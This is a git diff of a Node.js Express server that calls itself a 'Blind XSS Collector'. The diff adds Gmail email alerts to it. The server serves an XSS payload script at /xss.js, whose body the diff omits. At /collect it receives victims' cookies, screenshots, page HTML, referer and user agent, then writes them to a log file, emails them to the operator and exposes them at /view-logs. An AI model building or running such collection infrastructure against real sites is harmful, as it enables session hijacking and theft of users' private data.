@@ -1,21 +1,29 @@
+require('dotenv').config();
 const express = require('express');
+const nodemailer = require('nodemailer');
 const fs = require('fs');
+const path = require('path');
 const bodyParser = require('body-parser');
+
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Serve static files from the 'screenshots' folder
+app.use(bodyParser.json({ limit: '15mb' }));
+app.use(bodyParser.urlencoded({ extended: true }));
 app.use('/screenshots', express.static(path.join(__dirname, 'screenshots')));
 
-// Create "screenshots" folder if not exists
 if (!fs.existsSync('screenshots')) {
   fs.mkdirSync('screenshots');
 }
 
-app.use(bodyParser.json({ limit: '15mb' }));
-app.use(bodyParser.urlencoded({ extended: true }));
+const transporter = nodemailer.createTransport({
+  service: 'gmail',
+  auth: {
+    user: process.env.EMAIL_USER,
+    pass: process.env.EMAIL_PASS,
+  },
+});
 
-// Serve the XSS payload at /xss.js
 app.get('/xss.js', (req, res) => {
   res.setHeader('Content-Type', 'application/javascript');
   res.send(`
@@ -45,8 +53,7 @@ app.get('/xss.js', (req, res) => {
   `);
 });
 
-// Endpoint to receive data
-app.post('/collect', (req, res) => {
+app.post('/collect', async (req, res) => {
   const {
     screenshot, cookies, userAgent, referer,
     origin, html, iframe, time
@@ -73,13 +80,28 @@ app.post('/collect', (req, res) => {
     screenshot: screenshotPath
   };
 
-  console.log("🚨 Blind XSS Triggered:", logEntry);
+  // Append log
   fs.appendFileSync('logs.txt', JSON.stringify(logEntry) + "\n");
 
+  // Send email alert
+  const mailOptions = {
+    from: process.env.EMAIL_USER,
+    to: process.env.EMAIL_TO,
+    subject: 'Blind XSS Triggered!',
+    text: `XSS Triggered from IP: ${ip}\nData: ${JSON.stringify(logEntry, null, 2)}`
+  };
+
+  try {
+    await transporter.sendMail(mailOptions);
+    console.log('Email sent!');
+  } catch (error) {
+    console.error('Error sending email:', error);
+  }
+
+  console.log("🚨 Blind XSS Triggered:", logEntry);
   res.status(200).send('OK');
 });
 
-// ✅ Home route to avoid "Cannot GET /"
 app.get('/', (req, res) => {
   res.send(`
     <h2>🔍 Blind XSS Collector is Running!</h2>
@@ -89,14 +111,12 @@ app.get('/', (req, res) => {
   `);
 });
 
-// ✅ View logs route
 app.get('/view-logs', (req, res) => {
   const logs = fs.existsSync('logs.txt') ? fs.readFileSync('logs.txt', 'utf8') : 'No logs yet.';
   res.setHeader('Content-Type', 'text/plain');
   res.send(logs);
 });
 
-// Start server
 app.listen(PORT, () => {
   console.log(`✅ Server is running on port ${PORT}`);
 });
